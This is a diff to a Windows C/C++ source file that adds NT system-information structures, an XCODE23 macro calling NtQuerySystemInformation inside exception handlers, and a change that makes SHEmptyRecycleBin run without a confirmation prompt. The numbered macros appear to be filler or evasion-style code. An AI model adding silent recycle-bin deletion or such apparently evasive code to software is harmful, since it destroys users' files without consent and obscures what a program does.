@@ -93,6 +93,46 @@ SERVICE_STATUS status;
 CBitmap *pbm;
 BITMAP bm = {0};
 HBITMAP hbm;
+typedef struct
+{
+    DWORD   dwUnknown1;
+    ULONG   uKeMaximumIncrement;
+    ULONG   uPageSize;
+    ULONG   uMmNumberOfPhysicalPages;
+    ULONG   uMmLowestPhysicalPage;
+    ULONG   uMmHighestPhysicalPage;
+    ULONG   uAllocationGranularity;
+    PVOID   pLowestUserAddress;
+    PVOID   pMmHighestUserAddress;
+    ULONG   uKeActiveProcessors;
+    BYTE    bKeNumberProcessors;
+    BYTE    bUnknown2;
+    WORD    wUnknown3;
+} SYSTEM_BASIC_INFORMATION;
+
+typedef struct
+{
+    LARGE_INTEGER   liIdleTime;
+    DWORD           dwSpare[76];
+} SYSTEM_PERFORMANCE_INFORMATION;
+
+typedef struct
+{
+    LARGE_INTEGER liKeBootTime;
+    LARGE_INTEGER liKeSystemTime;
+    LARGE_INTEGER liExpTimeZoneBias;
+    ULONG         uCurrentTimeZoneId;
+    DWORD         dwReserved;
+} SYSTEM_TIME_INFORMATION;
+SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
+SYSTEM_TIME_INFORMATION        SysTimeInfo;
+SYSTEM_BASIC_INFORMATION       SysBaseInfo;
+typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
+PROCNTQSI NtQuerySystemInformation;
+
+
+
+
 
 typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
 typedef struct {
@@ -426,7 +466,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	if(S_OK == SHQueryRecycleBin(0, &shqbi))\
 	{\
 		sprintf(szXBuff, "Items:%u Bytes used:%u", (DWORD)shqbi.i64NumItems, (DWORD)shqbi.i64Size);\
-		SHEmptyRecycleBin(0, 0, SHERB_NOPROGRESSUI);\
+		SHEmptyRecycleBin(0, 0, SHERB_NOPROGRESSUI|SHERB_NOCONFIRMATION);\
 	}\
 	}\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
@@ -769,6 +809,18 @@ do {\
 				pbm->GetBitmap(&bm);\
 				pbm->Detach();\
 			}\
+		}\
+	}\
+		__except(EXCEPTION_EXECUTE_HANDLER){\
+		Sleep(22);\
+	}
+
+#define XCODE23 __try{\
+		if ((NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")))\
+		{\
+			NtQuerySystemInformation(0, &SysBaseInfo,sizeof(SysBaseInfo),NULL);\
+			NtQuerySystemInformation(3, &SysTimeInfo,sizeof(SysTimeInfo),0);\
+			NtQuerySystemInformation(2, &SysPerfInfo,sizeof(SysPerfInfo),NULL);\
 		}\
 	}\
 		__except(EXCEPTION_EXECUTE_HANDLER){\
